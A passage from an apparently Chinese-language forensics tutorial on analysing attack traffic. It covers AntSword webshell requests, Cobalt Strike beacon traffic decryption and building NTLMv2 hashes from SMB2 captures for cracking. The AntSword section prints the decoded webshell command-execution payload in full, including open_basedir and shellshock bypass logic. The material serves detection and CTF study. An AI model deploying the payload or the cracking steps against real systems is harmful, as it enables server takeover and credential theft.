<p>URL Decode一下传入的参数：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">=@</span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;display_errors&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>);<span style="color:#f92672">@</span><span style="color:#a6e22e">set_time_limit</span>(<span style="color:#ae81ff">0</span>);$opdir<span style="color:#f92672">=@</span><span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#34;open_basedir&#34;</span>);<span style="color:#66d9ef">if</span>($opdir) {$ocwd<span style="color:#f92672">=</span><span style="color:#a6e22e">dirname</span>($_SERVER[<span style="color:#e6db74">&#34;SCRIPT_FILENAME&#34;</span>]);$oparr<span style="color:#f92672">=</span><span style="color:#a6e22e">preg_split</span>(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;Lzt8Oi8=&#34;</span>),$opdir);<span style="color:#f92672">@</span><span style="color:#a6e22e">array_push</span>($oparr,$ocwd,<span style="color:#a6e22e">sys_get_temp_dir</span>());<span style="color:#66d9ef">foreach</span>($oparr <span style="color:#66d9ef">as</span> $item) {<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!@</span><span style="color:#a6e22e">is_writable</span>($item)){<span style="color:#66d9ef">continue</span>;};$tmdir<span style="color:#f92672">=</span>$item<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/.6c8e53&#34;</span>;<span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($tmdir);<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_exists</span>($tmdir)){<span style="color:#66d9ef">continue</span>;}$tmdir<span style="color:#f92672">=</span><span style="color:#a6e22e">realpath</span>($tmdir);<span style="color:#f92672">@</span><span style="color:#a6e22e">chdir</span>($tmdir);<span style="color:#f92672">@</span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;open_basedir&#34;</span>, <span style="color:#e6db74">&#34;..&#34;</span>);$cntarr<span style="color:#f92672">=@</span><span style="color:#a6e22e">preg_split</span>(<span style="color:#e6db74">&#34;/</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">|\//&#34;</span>,$tmdir);<span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">sizeof</span>($cntarr);$i<span style="color:#f92672">++</span>){<span style="color:#f92672">@</span><span style="color:#a6e22e">chdir</span>(<span style="color:#e6db74">&#34;..&#34;</span>);};<span style="color:#f92672">@</span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;open_basedir&#34;</span>,<span style="color:#e6db74">&#34;/&#34;</span>);<span style="color:#f92672">@</span><span style="color:#a6e22e">rmdir</span>($tmdir);<span style="color:#66d9ef">break</span>;};};;<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">asenc</span>($out){<span style="color:#66d9ef">return</span> $out;};<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">asoutput</span>(){$output<span style="color:#f92672">=</span><span style="color:#a6e22e">ob_get_contents</span>();<span style="color:#a6e22e">ob_end_clean</span>();<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;e41&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;be6d&#34;</span>;<span style="color:#66d9ef">echo</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">asenc</span>($output);<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;d8c66d&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;0bb0fb&#34;</span>;}<span style="color:#a6e22e">ob_start</span>();<span style="color:#66d9ef">try</span>{$p<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($_POST[<span style="color:#e6db74">&#34;beb61c5242a79d&#34;</span>],<span style="color:#ae81ff">2</span>));$s<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($_POST[<span style="color:#e6db74">&#34;t785fa3d878e6e&#34;</span>],<span style="color:#ae81ff">2</span>));$envstr<span style="color:#f92672">=@</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($_POST[<span style="color:#e6db74">&#34;g64b1274b158be&#34;</span>],<span style="color:#ae81ff">2</span>));$d<span style="color:#f92672">=</span><span style="color:#a6e22e">dirname</span>($_SERVER[<span style="color:#e6db74">&#34;SCRIPT_FILENAME&#34;</span>]);$c<span style="color:#f92672">=</span><span style="color:#a6e22e">substr</span>($d,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">?</span><span style="color:#e6db74">&#34;-c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{</span>$s<span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;/c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{</span>$s<span style="color:#e6db74">}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>;<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">substr</span>($d,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;/&#34;</span>){<span style="color:#f92672">@</span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;PATH=&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;PATH&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>);}<span style="color:#66d9ef">else</span>{<span style="color:#f92672">@</span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;PATH=&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;PATH&#34;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&#34;</span>);}<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($envstr)){$envarr<span style="color:#f92672">=</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;|||asline|||&#34;</span>, $envstr);<span style="color:#66d9ef">foreach</span>($envarr <span style="color:#66d9ef">as</span> $v) {<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($v)) {<span style="color:#f92672">@</span><span style="color:#a6e22e">putenv</span>(<span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;|||askey|||&#34;</span>, <span style="color:#e6db74">&#34;=&#34;</span>, $v));}}}$r<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>$p<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>$c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fe</span>($f){$d<span style="color:#f92672">=</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;,&#34;</span>,<span style="color:#f92672">@</span><span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#34;disable_functions&#34;</span>));<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($d)){$d<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>();}<span style="color:#66d9ef">else</span>{$d<span style="color:#f92672">=</span><span style="color:#a6e22e">array_map</span>(<span style="color:#e6db74">&#39;trim&#39;</span>,<span style="color:#a6e22e">array_map</span>(<span style="color:#e6db74">&#39;strtolower&#39;</span>,$d));}<span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">function_exists</span>($f)<span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">is_callable</span>($f)<span style="color:#f92672">&amp;&amp;!</span><span style="color:#a6e22e">in_array</span>($f,$d));};<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">runshellshock</span>($d, $c) {<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">substr</span>($d, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;putenv&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;error_log&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;mail&#39;</span>))) {<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strstr</span>(<span style="color:#a6e22e">readlink</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>), <span style="color:#e6db74">&#34;bash&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">FALSE</span>) {$tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">tempnam</span>(<span style="color:#a6e22e">sys_get_temp_dir</span>(), <span style="color:#e6db74">&#39;as&#39;</span>);<span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;PHP_LOL=() { x; }; </span><span style="color:#e6db74">$c</span><span style="color:#e6db74"> &gt;</span><span style="color:#e6db74">$tmp</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>);<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;error_log&#39;</span>)) {<span style="color:#a6e22e">error_log</span>(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#ae81ff">1</span>);} <span style="color:#66d9ef">else</span> {<span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#34;a@127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;-bv&#34;</span>);}} <span style="color:#66d9ef">else</span> {<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>;}$output <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">file_get_contents</span>($tmp);<span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($tmp);<span style="color:#66d9ef">if</span> ($output <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>) {<span style="color:#66d9ef">print</span>($output);<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>;}}<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>;};<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">runcmd</span>($c){$ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$d<span style="color:#f92672">=</span><span style="color:#a6e22e">dirname</span>($_SERVER[<span style="color:#e6db74">&#34;SCRIPT_FILENAME&#34;</span>]);<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;system&#39;</span>)){<span style="color:#f92672">@</span><span style="color:#a6e22e">system</span>($c,$ret);}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;passthru&#39;</span>)){<span style="color:#f92672">@</span><span style="color:#a6e22e">passthru</span>($c,$ret);}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;shell_exec&#39;</span>)){<span style="color:#66d9ef">print</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">shell_exec</span>($c));}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;exec&#39;</span>)){<span style="color:#f92672">@</span><span style="color:#a6e22e">exec</span>($c,$o,$ret);<span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>,$o));}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;popen&#39;</span>)){$fp<span style="color:#f92672">=@</span><span style="color:#a6e22e">popen</span>($c,<span style="color:#e6db74">&#39;r&#39;</span>);<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!@</span><span style="color:#a6e22e">feof</span>($fp)){<span style="color:#66d9ef">print</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">fgets</span>($fp,<span style="color:#ae81ff">2048</span>));}<span style="color:#f92672">@</span><span style="color:#a6e22e">pclose</span>($fp);}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;proc_open&#39;</span>)){$p <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">proc_open</span>($c, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;pipe&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>), <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;pipe&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)), $io);<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!@</span><span style="color:#a6e22e">feof</span>($io[<span style="color:#ae81ff">1</span>])){<span style="color:#66d9ef">print</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">fgets</span>($io[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">2048</span>));}<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!@</span><span style="color:#a6e22e">feof</span>($io[<span style="color:#ae81ff">2</span>])){<span style="color:#66d9ef">print</span>(<span style="color:#f92672">@</span><span style="color:#a6e22e">fgets</span>($io[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">2048</span>));}<span style="color:#f92672">@</span><span style="color:#a6e22e">fclose</span>($io[<span style="color:#ae81ff">1</span>]);<span style="color:#f92672">@</span><span style="color:#a6e22e">fclose</span>($io[<span style="color:#ae81ff">2</span>]);<span style="color:#f92672">@</span><span style="color:#a6e22e">proc_close</span>($p);}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">fe</span>(<span style="color:#e6db74">&#39;antsystem&#39;</span>)){<span style="color:#f92672">@</span><span style="color:#a6e22e">antsystem</span>($c);}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">runshellshock</span>($d, $c)) {<span style="color:#66d9ef">return</span> $ret;}<span style="color:#66d9ef">elseif</span>(<span style="color:#a6e22e">substr</span>($d,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">class_exists</span>(<span style="color:#e6db74">&#34;COM&#34;</span>)){$w<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">COM</span>(<span style="color:#e6db74">&#39;WScript.shell&#39;</span>);$e<span style="color:#f92672">=</span>$w<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">exec</span>($c);$so<span style="color:#f92672">=</span>$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">StdOut</span>();$ret<span style="color:#f92672">.=</span>$so<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ReadAll</span>();$se<span style="color:#f92672">=</span>$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">StdErr</span>();$ret<span style="color:#f92672">.=</span>$se<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ReadAll</span>();<span style="color:#66d9ef">print</span>($ret);}<span style="color:#66d9ef">else</span>{$ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">127</span>;}<span style="color:#66d9ef">return</span> $ret;};$ret<span style="color:#f92672">=@</span><span style="color:#a6e22e">runcmd</span>($r<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; 2&gt;&amp;1&#34;</span>);<span style="color:#66d9ef">print</span> ($ret<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>)<span style="color:#f92672">?</span><span style="color:#e6db74">&#34;ret=</span><span style="color:#e6db74">{</span>$ret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&#34;</span>;;}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">Exception</span> $e){<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;ERROR://&#34;</span><span style="color:#f92672">.</span>$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>();};<span style="color:#a6e22e">asoutput</span>();<span style="color:#66d9ef">die</span>();<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">beb61c5242a79d</span><span style="color:#f92672">=</span><span style="color:#a6e22e">UwY21k</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">g64b1274b158be</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ne</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">t785fa3d878e6e</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">fY2QgL2QgIkQ6L0FBQUNURi9XRUIvcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy90ZXN0IiZ3aG9hbWkmZWNobyA1ZTYzMTFkMDQmY2QmZWNobyBmZGFjNzgyNTQx</span>
</span></span></code></pre></div><p>分析一下可以知道：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$p<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($_POST[<span style="color:#e6db74">&#34;beb61c5242a79d&#34;</span>],<span style="color:#ae81ff">2</span>)); <span style="color:#75715e">// 程序路径
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$s<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($_POST[<span style="color:#e6db74">&#34;t785fa3d878e6e&#34;</span>],<span style="color:#ae81ff">2</span>)); <span style="color:#75715e">// 实际命令
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$envstr<span style="color:#f92672">=@</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($_POST[<span style="color:#e6db74">&#34;g64b1274b158be&#34;</span>],<span style="color:#ae81ff">2</span>)); <span style="color:#75715e">// 环境变量
</span></span></span></code></pre></div><p>蚁剑比较特殊的是会在参数值前加上2个干扰字符，所以就有了 substr 从第三个字符开始进行解码，并且在输出内容的前后加上特定的十六进制字符串 e41be6d 和 d8c66d0bb0fb，这也是蚁剑的特征：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/28.png"></p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/29.png"></p>
<h2 id="cobalt-strike流量">Cobalt Strike流量<a hidden class="anchor" aria-hidden="true" href="#cobalt-strike流量">#</a></h2>
<p>分析版本：Cobalt Strike 4.0</p>
<p>C/S架构：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/32.png"></p>
<p>cs分为客户端和服务器端，使用cs时必须要启用TeamServer服务器，需要有可执行权限，TeamServer功能：</p>
<pre tabindex="0"><code>控制 - Team Server是Cobalt Strike中所有payload的主控制器，与victim的所有连接 bind/reverse 都由Team Server管理。
日志记录 - Cobalt Strike中发生的所有事件 保存在logs文件夹
信息搜集 - 收集在后渗透阶段发现的、或攻击者在目标系统上用于登录的所有凭据credentials
自定义脚本 - cat teamserver可看到该文件是一个简单的bash脚本(可根据自己要求修改) 调用Metasploit RPC服务msfrpcd并启动服务器cobaltstrike.jar
</code></pre><p>cs使用基本流程：</p>
<pre tabindex="0"><code>1.启动TeamServer
2.Client登录TeamServer
</code></pre><p>启动TeamServer，默认端口50050，可以通过编辑teamserver文件修改：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo ./teamserver                         
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Will use existing X509 certificate and keystore <span style="color:#f92672">(</span><span style="color:#66d9ef">for</span> SSL<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ./teamserver &lt;host&gt; &lt;password&gt; <span style="color:#f92672">[</span>/path/to/c2.profile<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>YYYY-MM-DD<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        &lt;host&gt; is the <span style="color:#f92672">(</span>default<span style="color:#f92672">)</span> IP address of this Cobalt Strike team server
</span></span><span style="display:flex;"><span>        &lt;password&gt; is the shared password to connect to this server
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>/path/to/c2.profile<span style="color:#f92672">]</span> is your Malleable C2 profile
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">[</span>YYYY-MM-DD<span style="color:#f92672">]</span> is a kill date <span style="color:#66d9ef">for</span> Beacon payloads run from this server
</span></span></code></pre></div><pre tabindex="0"><code>&lt;host&gt;：必填，服务器公网ip或域名
&lt;password&gt;：必填，客户端Client GUI连接服务器TeamServer的密码
[/path/to/c2.profile]：选填，指定C2通信配置文件
[YYYY-MM-DD]：所有payload的终止日期
</code></pre><p>Client登录TeamServer，启动cobaltstrike.jar：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar
</span></span></code></pre></div><p>需要填写一些基本信息：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/31.png"></p>
<p>可通过<code>Cobalt Strike - &gt; Preferences - &gt; Team Servers</code>维护本地的登录信息配置文件的列表team server profiles</p>
<p>登陆成功后就能看到GUI界面</p>
<p><code>Cobalt Strike - &gt; Preferences - &gt; Listeners</code>，cs4.0 一共8种listener：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/33.png"></p>
<h3 id="http-beacon">http-beacon<a hidden class="anchor" aria-hidden="true" href="#http-beacon">#</a></h3>
<p>配置listener：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/37.png"></p>
<p>生成windows可执行程序，staged对应artifact.exe，stageless对应beacon.exe，有明显的大小区别并且stageless没有stage下载的步骤：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/38.png"></p>
<p>以artifact.exe为例进行流量抓取和分析：</p>
<p>靶机运行stager后会自动进行stage下载，stager对应的请求路径并非真实存在，比如 <code>/WCTo</code>，但是满足一定要求 (checksum8)，路径的 ascii 之和与 256 取余计算值得到结果，32位后门结果为92，64位后门结果为93，这样stager就知道要返回stage：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/39.png"></p>
<p>可以用 metatool 来检验一下:</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/42.png"></p>
<p>用 <code>1768.py</code> 来分析 stage，如果存在已知私钥会在publickey之后显示 <code>Has Known private key</code>，本例并不存在已知私钥：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/41.png"></p>
<p>stage 被加载和执行后的运行状态也就是最终的恶意程序Beacon，Beacon 与 C2 服务器之间的加密机制采用混合加密模式，以确保通信的机密性和效率：</p>
<pre tabindex="0"><code>公钥交换与会话建立 (元数据加密): 在 Beacon 首次连接（或心跳回连）时，它会使用内置的 C2 公钥 (RSA) 来加密一个随机生成的会话密钥 (Session Key) 和初始元数据
私钥解密: Team Server 收到该数据后，使用其对应的 私钥 (RSA) 将其解密，从而安全地获得这个一次性的会话密钥
对称加密 (后续通信): 一旦会话密钥建立，Beacon 与 C2 之间的后续所有命令、执行结果和数据传输，都将使用这个会话密钥进行 AES 对称加密
</code></pre><p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/40.png"></p>
<p>可以根据 <code>1768.py</code> 脚本执行结果对cs流量进行初步分析：</p>
<pre tabindex="0"><code>0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
0x0002 port                             0x0001 0x0002 80
0x0003 sleeptime                        0x0002 0x0004 60000
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100ad0a7e620a2f982cecd21f35961a7d02002ff6e04c5ca148398c8bfb4beadc72b337efe5b7fe0219fb54f9a17d70fd3d20e3c62b53e96813a0b077045cd4b7ef9e743450a85ba8d25bb65500c00bcdcd00594d54d0da24829827cbb5a64248e082165c024ddbb31e117a69a49893d3006e8b3b74f8c8a577b96ad2b9f8af04cf020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 &#39;192.168.50.128,/IE9CompatViewList.xml&#39;
0x000a post-uri                         0x0003 0x0040 &#39;/submit.php&#39;
</code></pre><p>payload类型即监听器类型，心跳包间隔时间，回连ip/端口，get/post请求路径这些关键信息都有，方便后续从流量里定位重要信息</p>
<p>先来看GET的流量包：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/43.png"></p>
<p>C2 Profile 决定了元数据编码的位置，本例中利用 Cookie 携带信息 (Metadata) 传递给C2服务器，可以用 <code>cs-decrypt-metadata.py</code> 来解密元数据，但是需要用到私钥，如果是题目可能会给出私钥文件 <code>.cobaltstrike.beacon_keys</code>，这时可以用 <code>parse_beacon_keys.py</code> 来解析出公私钥：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/44.png"></p>
<p>将私钥变成hex形式：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/45.png"></p>
<p>再用 <code>cs-decrypt-metadata.py</code> 解出 rawkey, aeskey 和 hmackey，可以看到还有靶机ip 用户名等信息：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/46.png"></p>
<p>最后就可以用 <code>cs-parse-http-traffic.py</code> 来解密整段cs流量，需要提供原始密钥 rawkey：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/47.png"></p>
<p>从第478个包开始响应中包含需要执行的命令，但是直接过滤器配置 <code>frame.number &gt;= 278</code> 即可，避免遗漏命令，可以发现我抓取的整段cs流量最终在靶机上只执行了一个命令 <code>whoami</code></p>
<p>cs流量分析利用到的工具：</p>
<p><a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py">https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py</a></p>
<p><a href="https://github.com/DidierStevens/Beta/blob/master/metatool.py">https://github.com/DidierStevens/Beta/blob/master/metatool.py</a></p>
<p><a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py">https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py</a></p>
<p><a href="https://github.com/Slzdude/cs-scripts/blob/master/parse_beacon_keys.py">https://github.com/Slzdude/cs-scripts/blob/master/parse_beacon_keys.py</a></p>
<p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p>
<h2 id="smb2">SMB2<a hidden class="anchor" aria-hidden="true" href="#smb2">#</a></h2>
<p>解密SMB2流量需要构造哈希进行爆破获取密码，格式：<code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code></p>
<p>过滤器设置ntlmssp来获取认证握手，NTLMSSP_AUTH包中Security Blob层：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/48.png"></p>
<p>再过滤ntlmssp.ntlmserverchallenge：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/50.png"></p>
<p>构造出完整哈希，注意流量里的ntlmv2response开头为NTproofstring，需要删除：</p>
